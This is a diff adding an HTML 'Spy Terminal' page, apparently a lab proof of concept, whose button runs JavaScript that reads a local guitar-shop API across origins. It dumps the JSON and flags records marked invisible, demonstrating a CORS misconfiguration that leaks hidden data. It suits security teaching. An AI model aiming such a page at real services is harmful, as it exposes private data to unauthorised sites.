@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Spy Terminal v2.0</title>
+    <style>
+        body { background-color: #0d0208; color: #00ff41; font-family: 'Courier New', monospace; padding: 40px; text-align: center; }
+        .terminal { border: 2px solid #00ff41; padding: 25px; background: rgba(0, 10, 0, 0.95); max-width: 850px; margin: 0 auto; box-shadow: 0 0 20px #00ff41; }
+        #log { margin-top: 25px; text-align: left; background: black; padding: 20px; min-height: 250px; border: 1px solid #333; word-break: break-all; white-space: pre-wrap; font-size: 14px; }
+        button { background: #00ff41; color: black; border: none; padding: 15px 40px; font-weight: bold; cursor: pointer; }
+        .secret-found { color: #ff00ff; font-weight: bold; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+<div class="terminal">
+    <h1>ACCESSING DATABASE...</h1>
+    <button onclick="runAttack()">EXPLOIT CORS & DUMP DATA</button>
+    <div id="log">READY FOR EXPLOIT...</div>
+</div>
+
+<script>
+    function runAttack() {
+        const log = document.getElementById('log');
+        log.innerHTML = "[*] Инициализация CORS атаки...<br>[*] Попытка обхода Same-Origin Policy...<br>";
+
+        fetch('http://localhost:8080/api/guitars')
+            .then(r => r.json())
+            .then(data => {
+                log.innerHTML = "[!] ДАННЫЕ УСПЕШНО ИЗВЛЕЧЕНЫ ИЗ БД:<br><br>";
+
+                const jsonOutput = JSON.stringify(data, null, 4);
+                log.innerHTML += jsonOutput;
+
+                const secretItem = data.find(g => g.visible === false);
+
+                if (secretItem) {
+                    log.innerHTML += `<br><br><span class='secret-found'>[ALERT] ОБНАРУЖЕН СКРЫТЫЙ ОБЪЕКТ: ${secretItem.model}!</span>`;
+                    console.log("Секрет найден:", secretItem);
+                }
+            })
+            .catch(e => {
+                log.innerHTML += "<br><span style='color:red'>[CRITICAL ERROR] CORS BLOCK: Сервер защищен.</span>";
+            });
+    }
+</script>
+</body>
+</html>
